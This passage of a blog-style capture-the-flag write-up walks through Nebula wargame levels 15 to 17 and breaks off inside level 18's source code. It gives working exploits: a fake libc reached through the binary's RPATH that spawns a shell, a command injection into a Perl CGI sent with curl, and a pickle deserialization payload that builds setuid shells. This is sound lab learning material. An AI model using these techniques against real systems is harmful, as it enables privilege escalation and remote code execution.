+You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.
+Clean up after yourself :)
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;Logged in as user &lt;code&gt;level15&lt;/code&gt;, we see 1 file in the &lt;code&gt;flag15&lt;/code&gt; directory called &lt;code&gt;flag15&lt;/code&gt;. Running it simply tells us to &lt;em&gt;strace it!&lt;/em&gt;. Running it with &lt;code&gt;strace&lt;/code&gt; immediately reveals a whole bunch of interesting things about &lt;code&gt;flag15&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level15@nebula:/home/flag15$ strace ./flag15
+execve(&amp;quot;./flag15&amp;quot;, [&amp;quot;./flag15&amp;quot;], [/* 20 vars */]) = 0
+brk(0)                                  = 0x88c9000
+access(&amp;quot;/etc/ld.so.nohwcap&amp;quot;, F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786b000
+access(&amp;quot;/etc/ld.so.preload&amp;quot;, R_OK)      = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15/tls/i686/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/tls/i686/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15/tls/i686&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15/tls/sse2/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/tls/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15/tls/sse2&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/tls/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15/tls/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/tls/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15/tls&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15/i686/sse2/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/i686/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15/i686/sse2&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/i686/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15/i686/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/i686/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15/i686&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15/sse2/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15/sse2&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
+open(&amp;quot;/var/tmp/flag15/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64(&amp;quot;/var/tmp/flag15&amp;quot;, {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
+open(&amp;quot;/etc/ld.so.cache&amp;quot;, O_RDONLY)      = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
+mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7862000
+close(3)                                = 0
+access(&amp;quot;/etc/ld.so.nohwcap&amp;quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&amp;quot;/lib/i386-linux-gnu/libc.so.6&amp;quot;, O_RDONLY) = 3
+read(3, &amp;quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&amp;quot;..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
+mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xe78000
+mmap2(0xfee000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xfee000
+mmap2(0xff1000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xff1000
+close(3)                                = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7861000
+set_thread_area({entry_number:-1 -&amp;gt; 6, base_addr:0xb78618d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+mprotect(0xfee000, 8192, PROT_READ)     = 0
+mprotect(0x8049000, 4096, PROT_READ)    = 0
+mprotect(0x199000, 4096, PROT_READ)     = 0
+munmap(0xb7862000, 33815)               = 0
+fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786a000
+write(1, &amp;quot;strace it!\n&amp;quot;, 11strace it!
+)            = 11
+exit_group(11)                          = ?
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There are &lt;strong&gt;plenty&lt;/strong&gt; of attempts to load &lt;code&gt;libc.so.6&lt;/code&gt; from various locations! I checked out what is in &lt;code&gt;/var/tmp&lt;/code&gt; and found the original &lt;code&gt;flag15&lt;/code&gt; folder there. It was empty. My initial thought were I need to give it a &lt;code&gt;libc.so.6&lt;/code&gt; to load, but obviously one that will be useful enough to me so that I may gain some form of code execution.&lt;/p&gt;
+
+&lt;p&gt;This challenge had me on another Google ride in order to understand what is going on here. From what I could gather, when a binary is compiled with &lt;code&gt;gcc&lt;/code&gt;, it is possible to add &lt;code&gt;hwcap&lt;/code&gt; support for different processor architectures. It is also possible to tell the linker from where it should load dynamic libraries using a &lt;a href=&#34;http://en.wikipedia.org/wiki/Rpath&#34;&gt;rpath&lt;/a&gt;. In the case of &lt;code&gt;flag15&lt;/code&gt;, the &lt;code&gt;RPATH&lt;/code&gt; is set to &lt;code&gt;/var/tmp/flag15&lt;/code&gt;. We can see this using &lt;code&gt;readelf&lt;/code&gt; and looking at the dynamic section:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/home/flag15$ readelf -d ./flag15
+
+Dynamic section at offset 0xf20 contains 21 entries:
+  Tag        Type                         Name/Value
+ 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
+ 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
+ 0x0000000c (INIT)                       0x80482c0
+ 0x0000000d (FINI)                       0x80484ac
+
+ [...]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ok, so that kinda explained the &lt;em&gt;why&lt;/em&gt; its loading libc.so.6 from there, but not really the &amp;lsquo;how this can be useful&amp;rsquo;. I was still a little stuck on the previous &lt;code&gt;LD_PRELOAD&lt;/code&gt; hackery, but had to constantly remind myself that that environment variable will be discarded in the case of the SETUID program.&lt;/p&gt;
+
+&lt;p&gt;I was a little unsure how to get something useful going from here. I touched a file called &lt;code&gt;libc.so.6&lt;/code&gt; in &lt;code&gt;/var/tmp/flag15/&lt;/code&gt; and launched the binary, just to get a starting point:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ touch libc.so.6
+level15@nebula:/var/tmp/flag15$ ~flag15/flag15
+/home/flag15/flag15: error while loading shared libraries: /var/tmp/flag15/libc.so.6: file too short
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I was not expecting much from that attempt, but it helped me get started. Eventually I figured I could have a look at &lt;code&gt;flag15&lt;/code&gt; and check which libc function I could &amp;ldquo;override??&amp;rdquo; from the RELO table:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ objdump -R ~flag15/flag15
+
+/home/flag15/flag15:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049ff0 R_386_GLOB_DAT    __gmon_start__
+0804a000 R_386_JUMP_SLOT   puts
+0804a004 R_386_JUMP_SLOT   __gmon_start__
+0804a008 R_386_JUMP_SLOT   __libc_start_main
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;puts()&lt;/code&gt; seems like an ok target for me! This is probably the function used to print the &lt;em&gt;strace it!&lt;/em&gt; message. At this stage I figured I could take the same route as I did with the previous &lt;code&gt;LD_PRELOAD&lt;/code&gt; attack, except this time I just &amp;lsquo;fake&amp;rsquo; it in my fake libc. I looked up the &lt;code&gt;puts()&lt;/code&gt; arguments from the man page again and started a new function:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat fake_libc.c
+#include&amp;lt;stdio.h&amp;gt;
+int puts(const char *s) {
+    printf(&amp;quot;Not the real puts!\n&amp;quot;);
+}
+
+level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6
+
+level15@nebula:/var/tmp/flag15$ ~flag15/flag15
+/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
+/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
+/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ow, that exploded pretty badly it seems. From the error message I figured the function &lt;code&gt;__cxa_finalize&lt;/code&gt; simply did not exist in my library, so all I had to do was add it&amp;hellip; Right? I googled the &lt;a href=&#34;https://refspecs.linuxbase.org/LSB_3.2.0/LSB-Core-generic/LSB-Core-generic/baselib---cxa_finalize.html&#34;&gt;function arguments&lt;/a&gt; and added it to my fake libc:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat fake_libc.c
+#include&amp;lt;stdio.h&amp;gt;
+void __cxa_finalize(void * d) {
+}
+
+int puts(const char *s) {
+    printf(&amp;quot;Not the real puts!\n&amp;quot;);
+}
+level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6
+level15@nebula:/var/tmp/flag15$ ~flag15/flag15
+/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
+/home/flag15/flag15: relocation error: /home/flag15/flag15: symbol __libc_start_main, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Oh! New error. I guess I was making progress. This time there is apparently no &lt;code&gt;__libc_start_main&lt;/code&gt; in the library. At this stage I was a little confused as to what was going on here as this function was also in the RELO table for &lt;code&gt;flag15&lt;/code&gt;. Anyways, as with &lt;code&gt;__cxa_finalize&lt;/code&gt;, I Googled the &lt;a href=&#34;http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html&#34;&gt;function arguments&lt;/a&gt; for this one too and added it to my fake libc. It was also at this stage that I realized I could just use this function instead of &lt;code&gt;puts&lt;/code&gt;, so I went ahead and deleted the other functions:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat fake_libc.c
+#include&amp;lt;stdio.h&amp;gt;
+
+int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
+    return 0;
+}
+
+level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6
+level15@nebula:/var/tmp/flag15$ ~flag15/flag15
+/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
+Inconsistency detected by ld.so: dl-lookup.c: 169: check_match: Assertion `version-&amp;gt;filename == ((void *)0) || ! _dl_name_match_p (version-&amp;gt;filename, map)&#39; failed!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Oh! Another new error :( This time though it was not about a missing function/symbol, but rather something I could not make out by myself. I found little information about this specific error. After a really really long time of searching I finally decided to &lt;code&gt;ldd&lt;/code&gt; &lt;code&gt;flag15&lt;/code&gt; again now that my fake libc is available:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15
+/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
+    linux-gate.so.1 =&amp;gt;  (0x00e47000)
+    libc.so.6 =&amp;gt; /var/tmp/flag15/libc.so.6 (0x00761000)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The search term &lt;em&gt;no version information available (required by&lt;/em&gt; was the magic that finally got me towards an answer! I came across &lt;a href=&#34;http://stackoverflow.com/questions/137773/what-does-the-no-version-information-available-error-from-linux-dynamic-linker&#34;&gt;this&lt;/a&gt; and &lt;a href=&#34;http://superuser.com/questions/735736/no-version-information-available-required-by-usr-bin-ssh&#34;&gt;this&lt;/a&gt; post which talks about custom linking scripts. Basically, if I were to create a file with the contents &lt;code&gt;GLIBC_2.0 {};&lt;/code&gt; in it and tell the linker at compile time (with &lt;code&gt;-Wl&lt;/code&gt;) about it, then my problem will go away :)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat version.ld
+GLIBC_2.0 {
+};
+
+level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,--version-script=version.ld fake_libc.c -o libc.so.6
+level15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15
+    linux-gate.so.1 =&amp;gt;  (0x002b3000)
+    libc.so.6 =&amp;gt; /var/tmp/flag15/libc.so.6 (0x00ca0000)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;w00t. My &lt;code&gt;ldd&lt;/code&gt; Error went away :)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,--version-script=version.ld fake_libc.c -o libc.so.6
+level15@nebula:/var/tmp/flag15$ ~flag15/flag15
+/home/flag15/flag15: /var/tmp/flag15/libc.so.6: version `GLIBC_2.1.3&#39; not found (required by /var/tmp/flag15/libc.so.6)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Another version related error. This time though it was for GLIBC version 2.1.3. I spiraled down another Google tunnel with this one and eventually came across static linking options for the linker. Basically, with &lt;code&gt;-Bstatic&lt;/code&gt; and &lt;code&gt;-static-libgcc&lt;/code&gt; we tell the compiler not to link against shared libraries. So, I added these too:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6
+level15@nebula:/var/tmp/flag15$ ~flag15/flag15
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And now we are segfaulting. Great! &lt;strong&gt;Not!&lt;/strong&gt; I poked around &lt;code&gt;gdb&lt;/code&gt; a little and prodded around. Eventually I figured I should check if my &lt;code&gt;__libc_start_main&lt;/code&gt; function is being called before the crash:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat fake_libc.c
+#include&amp;lt;stdio.h&amp;gt;
+
+int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
+    printf(&amp;quot;hi mom!\n&amp;quot;); /* Added this line! */
+    return 0;
+}
+level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6
+level15@nebula:/var/tmp/flag15$ ~flag15/flag15
+hi mom!
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Yes! :D So even though I am causing &lt;code&gt;flag15&lt;/code&gt; to crash, I have managed to introduce some code to it. I finally decided to add the &lt;code&gt;system()&lt;/code&gt; call and recompile my fake libc.&lt;/p&gt;
+
+&lt;p&gt;So, to solve level15:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat fake_libc.c
+#include&amp;lt;stdio.h&amp;gt;
+
+int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
+    system(&amp;quot;/bin/sh&amp;quot;);
+    return 0;
+}
+level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6
+level15@nebula:/var/tmp/flag15$ ~flag15/flag15
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level16:0683a5d670a26d450d97365e52610fb5&#34;&gt;level16&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level16/&#34;&gt;Level16&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+There is a perl script running on port 1616.
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;With the description we are provided with the source code of a small Perl program:&lt;/p&gt;
+
+&lt;p&gt;```perl index.pl
+#!/usr/bin/env perl&lt;/p&gt;
+
+&lt;p&gt;use CGI qw{param};&lt;/p&gt;
+
+&lt;p&gt;print &amp;ldquo;Content-type: text/html\n\n&amp;rdquo;;&lt;/p&gt;
+
+&lt;p&gt;sub login {
+  $username = $&lt;em&gt;[0];
+  $password = $&lt;/em&gt;[1];&lt;/p&gt;
+
+&lt;p&gt;$username =~ tr/a-z/A-Z/; # conver to uppercase
+  $username =~ s/\s.*//;        # strip everything after a space&lt;/p&gt;
+
+&lt;p&gt;@output = &lt;code&gt;egrep &amp;quot;^$username&amp;quot; /home/flag16/userdb.txt 2&amp;gt;&amp;amp;1&lt;/code&gt;;
+  foreach $line (@output) {
+      ($usr, $pw) = split(/:/, $line);&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;  if($pw =~ $password) {
+      return 1;
+  }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;}&lt;/p&gt;
+
+&lt;p&gt;return 0;
+}&lt;/p&gt;
+
+&lt;p&gt;sub htmlz {
+  print(&amp;rdquo;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&amp;rdquo;);
+  if($_[0] == 1) {
+      print(&amp;ldquo;Your login was accepted&lt;br/&gt;&amp;rdquo;);
+  } else {
+      print(&amp;ldquo;Your login failed&lt;br/&gt;&amp;rdquo;);
+  }
+  print(&amp;ldquo;Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n&amp;rdquo;);
+}&lt;/p&gt;
+
+&lt;p&gt;htmlz(login(param(&amp;ldquo;username&amp;rdquo;), param(&amp;ldquo;password&amp;rdquo;)));&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+This script has a seemingly less obvious command injection vulnerability. The `egrep` command eventually gets the `$username` variable. This after it has gone through 2 sets of filters, one converting the username to uppercase and another truncating everything after a space. These filters are the core of the challenge.
+
+Similarly to the other command injections, I replicated the filters so that I could print the output and see how I could manipulate them. The biggest problem being the fact that everything was converted to uppercase. Thankfully, that got sorted really quickly when I learnt of the `${A,,}` operator in bash. After quite a bit of trying different things, I finally got something that would work. I would first make the egrep happy by redirecting something to it to grep through. Once that was done, I declared a new variable `A` and set the command I wanted to run to it. Thereafter I converted it to lowercase and executed it wit `${A,,}` and commented the rest of the line out with a hash (#).
+
+So, to solve level16:
+
+```bash
+level16@nebula:~$ vim /var/tmp/flag16.sh
+level16@nebula:~$ chmod +x /var/tmp/flag16.sh
+level16@nebula:~$ cat /var/tmp/flag16.sh
+#!/bin/sh
+gcc /var/tmp/shell.c -o /var/tmp/flag16
+chmod 4777 /var/tmp/flag16
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On my host machine, I requested the web page hosting the perl script, triggering &lt;code&gt;/var/tmp/flag16&lt;/code&gt; to run:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ » curl -v &amp;quot;http://192.168.217.239:1616/index.cgi?$(python -c &#39;import urllib; print urllib.urlencode({ &amp;quot;username&amp;quot; : &amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;lt;/etc/passwd;A=&amp;quot;/var/tmp/flag16.sh&amp;quot;;${A,,};#&amp;quot;&amp;quot;&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;a&amp;quot; })&#39;)&amp;quot;
+* Hostname was NOT found in DNS cache
+*   Trying 192.168.217.239...
+* Connected to 192.168.217.239 (192.168.217.239) port 1616 (#0)
+&amp;gt; GET /index.cgi?username=%22%3C%2Fetc%2Fpasswd%3BA%3D%22%2Fvar%2Ftmp%2Fflag16.sh%22%3B%24%7BA%2C%2C%7D%3B%23&amp;amp;password=a HTTP/1.1
+&amp;gt; User-Agent: curl/7.37.1
+&amp;gt; Host: 192.168.217.239:1616
+&amp;gt; Accept: */*
+&amp;gt;
+* HTTP 1.0, assume close after body
+&amp;lt; HTTP/1.0 200 OK
+&amp;lt; Content-type: text/html
+&amp;lt;
+&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Login resuls&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;Your login failed&amp;lt;br/&amp;gt;Would you like a cookie?&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+* Closing connection 0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And then, just to read the flag:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level16@nebula:~$ /var/tmp/flag16
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level17:0683a5d670a26d450d97365e52610fb5&#34;&gt;level17&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level17/&#34;&gt;Level17&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+There is a python script listening on port 10007 that contains a vulnerability.
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;With the description we are provided with the source code of a small Python program:&lt;/p&gt;
+
+&lt;p&gt;```perl level17.py
+#!/usr/bin/python&lt;/p&gt;
+
+&lt;p&gt;import os
+import pickle
+import time
+import socket
+import signal&lt;/p&gt;
+
+&lt;p&gt;signal.signal(signal.SIGCHLD, signal.SIG_IGN)&lt;/p&gt;
+
+&lt;p&gt;def server(skt):
+  line = skt.recv(1024)&lt;/p&gt;
+
+&lt;p&gt;obj = pickle.loads(line)&lt;/p&gt;
+
+&lt;p&gt;for i in obj:
+      clnt.send(&amp;ldquo;why did you send me &amp;rdquo; + i + &amp;ldquo;?\n&amp;rdquo;)&lt;/p&gt;
+
+&lt;p&gt;skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+skt.bind((&amp;lsquo;0.0.0.0&amp;rsquo;, 10007))
+skt.listen(10)&lt;/p&gt;
+
+&lt;p&gt;while True:
+  clnt, addr = skt.accept()&lt;/p&gt;
+
+&lt;p&gt;if(os.fork() == 0):
+      clnt.send(&amp;ldquo;Accepted connection from %s:%d&amp;rdquo; % (addr[0], addr[1]))
+      server(clnt)
+      exit(1)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+With this level, it was immediately obvious that user input was being used to unpickle. This is dangerous as user supplied code could be executed when the unpickle occurs. So, my plan was to write a simple class with a `__reduce__` method to pickle and send that over the socket that this code is listening on.
+
+So, to solve level17:
+
+```bash
+level17@nebula:/var/tmp/flag17-prep$ cat sploit.py
+from netcat import Netcat
+import pickle
+import os
+
+command = &amp;quot;&amp;quot;&amp;quot;gcc /var/tmp/shell.c -o /var/tmp/flag17; chmod 4777 /var/tmp/flag17&amp;quot;&amp;quot;&amp;quot;
+
+# setup the pickle
+class DoCmd(object):
+    def __reduce__(self):
+        return (os.system, (&#39;{cmd}&#39;.format(cmd = command),))
+
+nc =  Netcat(&#39;127.0.0.1&#39;, 10007)
+nc.read()
+nc.write(pickle.dumps(DoCmd()))
+nc.close()
+
+level17@nebula:/var/tmp/flag17-prep$ python sploit.py
+level17@nebula:/var/tmp/flag17-prep$ /var/tmp/flag17
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level18:0683a5d670a26d450d97365e52610fb5&#34;&gt;level18&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level18/&#34;&gt;Level18&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;
+
+&lt;p&gt;```c level18.c
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;getopt.h&gt;&lt;/p&gt;
+
+&lt;p&gt;struct {
+  FILE *debugfile;
+  int verbose;
+  int loggedin;
+} globals;&lt;/p&gt;
+
+&lt;p&gt;#define dprintf(&amp;hellip;) if(globals.debugfile) \
+  fprintf(globals.debugfile, &lt;strong&gt;VA_ARGS&lt;/strong&gt;)
+#define dvprintf(num, &amp;hellip;) if(globals.debugfile &amp;amp;&amp;amp; globals.verbose &amp;gt;= num) \
+  fprintf(globals.debugfile, &lt;strong&gt;VA_ARGS&lt;/strong&gt;)&lt;/p&gt;
+
+&lt;p&gt;#define PWFILE &amp;ldquo;/home/flag18/password&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;void login(char *pw)
+{
+  FILE *fp;&lt;/p&gt;
+
+&lt;p&gt;fp = fopen(PWFILE, &amp;ldquo;r&amp;rdquo;);
+  if(fp) {
+      char file[64];&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;  if(fgets(file, sizeof(file) - 1, fp) == NULL) {
+      dprintf(&amp;quot;Unable to read password file %s\n&amp;quot;, PWFILE);
+      return;
+  }
+            fclose(fp);
+  if(strcmp(pw, file) != 0) return;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;}
